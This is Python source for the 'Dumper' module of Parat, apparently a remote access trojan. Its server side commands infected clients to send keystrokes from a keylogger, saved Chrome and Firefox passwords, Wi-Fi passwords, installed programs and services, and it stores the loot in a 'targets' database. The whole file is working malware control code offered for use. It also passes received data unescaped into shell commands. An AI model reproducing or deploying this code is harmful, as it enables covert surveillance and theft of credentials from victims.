#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import re
import argparse
from time import sleep
from os import system
from os.path import isfile, abspath
from lib.ParatPrint import colorize, pprint, gray
from lib.ProcessThread import ParatProcessBar
from lib.ParatEncrypt import Encode, Decode


class ParatDumper:


    def __init__(self, connection, client_id, db, args, colors):

        self.helps              = ["-h", "--help"]
        self.keylogger_name     = "keys.txt"
        self.services_file_name = "services.txt"
        self.programs_file_name = "programs.txt"
        self.chrome_file_name   = "chrome.txt"
        self.mozilla_file_name  = "mozilla.txt"
        self.wifi_file_name     = "wifi.txt"
        self.handler            = "#DATA_HANDLER"
        self.conn               = connection
        self.client_id          = client_id
        self.db                 = db
        self.args               = args
        self.colors             = colors
        self.path_to_sfile      = abspath(self.services_file_name)
        self.path_to_pfile      = abspath(self.programs_file_name)
        self.path_to_chrome     = abspath(self.chrome_file_name)
        self.path_to_mozilla    = abspath(self.mozilla_file_name)
        self.path_to_wifi       = abspath(self.wifi_file_name)



    def dump_changes(self):

        self.conn.send(Encode(">ch4ng3s<"))
        recived_data = Decode(self.conn.recv(4096))

        while self.handler not in recived_data:
            pprint(recived_data)
            sleep(0.1)
            recived_data = Decode(self.conn.recv(4096))




    def dump_keys(self):

        try:

            if not isfile(self.keylogger_name):
                system("touch '{}'".format(self.keylogger_name))

            self.conn.send(Encode(">keyl0gger<"))
            recived_data = Decode(self.conn.recv(4096))
            pprint(recived_data)

            system("echo '{}' >> {}".format(recived_data, self.keylogger_name))

        except Exception as e:

            pprint(
                colorize(
                    e + "\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)



    def dump_wifi(self, update=False):

        try:

            if not isfile(self.path_to_wifi) or update:

                self.conn.send(Encode(">wif1<"))

                text = colorize(
                    "dumping wifi",
                    colored=self.colors,
                    status="INF"
                )
                process_bar = ParatProcessBar(text)
                process_bar.start_process()

                recived_data = Decode(self.conn.recv(4096))
                full_content = ""

                if "No wifi(es) found." in recived_data:
                    full_content = recived_data

                else:

                    while recived_data:

                        recived_data += "\n"
                        full_content += recived_data
                        recived_data = Decode(self.conn.recv(4096))
                        sleep(0.1)

                        if self.handler in recived_data:
                            full_content = full_content.replace(self.handler, "").rstrip() + "\n"; break


                with open(self.wifi_file_name, 'wb') as wifi_file:
                    wifi_file.write(full_content)
                wifi_file.close()

                process_bar.Stop = True
                sleep(0.2)
                pprint(
                    colorize(
                        "successfull!\n",
                        colored=self.colors,
                        status="SUC"
                    ))
            else:
                pass


        except Exception as e:

            if not process_bar.Stop:
                process_bar.Stop = True; sleep(0.2)
            pprint(
                colorize(
                    e + "\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)

        else:
            system("cat '{}'".format(self.path_to_wifi))



    def dump_services(self, update=False):

        try:

            if not isfile(self.path_to_sfile) or update:

                self.conn.send(Encode("services"))
                services_file = open(self.services_file_name, 'wb')

                text = colorize(
                    "dumping services",
                    colored=self.colors,
                    status="INF"
                )
                process_bar = ParatProcessBar(text)
                process_bar.start_process()

                service = self.conn.recv(4096)

                while service:

                    services_file.write(service.rstrip("\n\n"))
                    sleep(0.1)
                    service = self.conn.recv(4096)

                    if self.handler in service:
                        service = service.replace(self.handler, "").rstrip()
                        break

                services_file.close()

                process_bar.Stop = True; sleep(0.2)
                pprint(
                    colorize(
                        "Services dumped: %s\n\n" % \
                        self.services_file_name,
                        colored=self.colors,
                        status="SUC"
                    ))
            else:
                pass


        except Exception as e:

            if not process_bar.Stop:
                process_bar.Stop = True; sleep(0.2)
            pprint(
                colorize(
                    e + "\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)

        else:

            sfile = open(self.path_to_sfile, 'r')
            scontent = sfile.read()

            self.db.execute("UPDATE targets SET Services=? WHERE id=?", (scontent, self.client_id))
            self.db.commit()

            pprint("\n" + scontent + "\n")

            sfile.close()



    def dump_programs(self, update=False):

        try:

            if not isfile(self.path_to_pfile) or update:

                self.conn.send(Encode("programs"))
                program_file = open("null.txt", 'wb')

                text = colorize(
                    "dumping programs",
                    colored=self.colors,
                    status="INF"
                )
                process_bar = ParatProcessBar(text)
                process_bar.start_process()
                program = self.conn.recv(4096)

                while program:

                    if self.handler in program:
                        program = program.replace(self.handler, "").rstrip()
                        break

                    program_file.write(program)
                    sleep(0.1)
                    program = self.conn.recv(4096).rstrip()

                program_file.close()

                system(r"tr < null.txt -d '\000' > programs.txt")
                sleep(.1)
                system("rm null.txt")

                process_bar.Stop = True; sleep(0.2)
                pprint(
                    colorize(
                        "Programs dumped: %s\n\n" % \
                        self.programs_file_name,
                        colored=self.colors,
                        status="SUC"
                    ))
            else:
                pass


        except Exception as e:

            if not process_bar.Stop:
                process_bar.Stop = True; sleep(0.2)

            pprint(
                colorize(
                    e + "\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)


        else:

            displayer  = "\n   \033[1;34mName" + " "*105 + "Version\033[1;m\n "
            displayer += "=" * 123

            with open(self.path_to_pfile, "r") as progs_file:

                pcontent = progs_file.read()
                result = re.findall(r'Name=(.+$)\nVersion=(.+$)', pcontent, re.MULTILINE)

                self.db.execute("UPDATE targets SET Programs=? WHERE id=?", (str(result), self.client_id))
                self.db.commit()

                pprint(displayer + '\n') if self.colors else pprint(gray(displayer) + '\n')

                for i, program in enumerate(result, 1):

                    name = re.sub(r'\\x.{2}.?', "", repr(program[0].replace("\r", ""))).replace("'", "")
                    ver  = program[1].replace("\r", "")
                    pprint(" {:<110}{}\n".format(str(i) + "-" + name, ver))

                pprint("\n")

            progs_file.close()



    def dump_chrome(self, update=False):

        try:

            if not isfile(self.path_to_chrome) or update:

                self.conn.send(Encode("passwords<#>chrome"))

                text = colorize(
                    "dumping chrome passwords",
                    colored=self.colors,
                    status="INF"
                )
                process_bar = ParatProcessBar(text)
                process_bar.start_process()

                result = Decode(self.conn.recv(4096))
                full_content = result

                if "No password" in result or "Could not" in result or "doesn't exists" in result or "[!]" in result:
                    pass

                else:

                    while True:

                        full_content += result
                        result = Decode(self.conn.recv(4096))
                        sleep(0.1)

                        if self.handler in result:
                            full_content += "\n"; break

                with open(self.chrome_file_name, 'wb') as chrome_file:
                    chrome_file.write(full_content)
                chrome_file.close()

                process_bar.Stop = True
                sleep(0.2)
                pprint(
                    colorize(
                        "successfull!\n",
                        colored=self.colors,
                        status="SUC"
                    ))

            else:
                pass


        except Exception as e:

            if not process_bar.Stop:
                process_bar.Stop = True; sleep(0.2)
            pprint(
                colorize(
                    e + "\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)

        else:

            cfile = open(self.path_to_chrome, 'r')
            ccontent = cfile.read()

            self.db.execute("UPDATE targets SET Chrome=? WHERE id=?", (ccontent, self.client_id))
            self.db.commit()

            pprint(ccontent + "\n")

            cfile.close()




    def dump_mozilla(self, update=False):

        try:

            if not isfile(self.path_to_mozilla) or update:

                self.conn.send(Encode("passwords<#>mozilla"))

                text = colorize(
                    "dumping mozilla passwords",
                    colored=self.colors,
                    status="INF"
                )
                process_bar = ParatProcessBar(text)
                process_bar.start_process()

                result = Decode(self.conn.recv(4096))
                full_content = result

                if "No password" in result or "Could not" in result or "doesn't exists" in result or "[!]" in result:
                    pass

                else:

                    while True:

                        full_content += result
                        result = Decode(self.conn.recv(4096))
                        sleep(0.1)

                        if self.handler in result:
                            full_content += "\n"; break

                with open(self.mozilla_file_name, 'wb') as moz_file:
                    moz_file.write(full_content)
                moz_file.close()

                process_bar.Stop = True; sleep(0.2)
                pprint(
                    colorize(
                        "successfull!\n",
                        colored=self.colors,
                        status="SUC"
                    ))

            else:
                pass


        except Exception as e:

            if not process_bar.Stop:
                process_bar.Stop = True; sleep(0.2)
            pprint(
                colorize(
                    e + "\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)

        else:

            mfile = open(self.path_to_mozilla, 'r')
            mcontent = mfile.read()

            self.db.execute("UPDATE targets SET Mozilla=? WHERE id=?", (mcontent, self.client_id))
            self.db.commit()

            pprint(mcontent + "\n")

            mfile.close()




    def prepare_basics(self):

        self.parser = argparse.ArgumentParser(
            prog         = "modules.Dumper",
            usage        = "dump <argument>",
            description  = "usefull command for find secrets"
        )

        self.parser.add_argument(
            '-x', '--changes',
            action       = "store_true",
            help         = "dump any change(s) on disk!"
        )
        self.parser.add_argument(
            '-k', '--keylogger',
            action       = "store_true",
            help         = "dump user pressed keys"
        )
        self.parser.add_argument(
            '-s', '--services',
            action       = "store_true",
            help         = "dump target services"
        )
        self.parser.add_argument(
            '-p', '--programs',
            action       = "store_true",
            help         = "dump target programs"
        )
        self.parser.add_argument(
            '-c', '--chrome',
            action       = "store_true",
            help         = "dump google chrome saved password(s)"
        )
        self.parser.add_argument(
            '-m', '--mozilla',
            action       = "store_true",
            help         = "dump firefox saved password(s)"
        )
        self.parser.add_argument(
            '-w', '--wifi',
            action       = "store_true",
            help         = "dump wifi saved password(s)"
        )
        self.parser.add_argument(
            '-u', '--update',
            action       = "store_true",
            help         = "force update(don't use cache if available)"
        )




    def start(self):

        if self.args is None or len(self.args) == 0 or self.args[0] in self.helps:
            self.parser.print_help()

        else:

            try:

                argument = self.parser.parse_args(self.args)

                u_flag = False
                if argument.update:
                    u_flag = True

                if argument.changes:
                    self.dump_changes()
                elif argument.keylogger:
                    self.dump_keys()
                elif argument.services:
                    self.dump_services(u_flag)
                elif argument.programs:
                    self.dump_programs(u_flag)
                elif argument.chrome:
                    self.dump_chrome(u_flag)
                elif argument.mozilla:
                    self.dump_mozilla(u_flag)
                elif argument.wifi:
                    self.dump_wifi(u_flag)

            except:
                pass
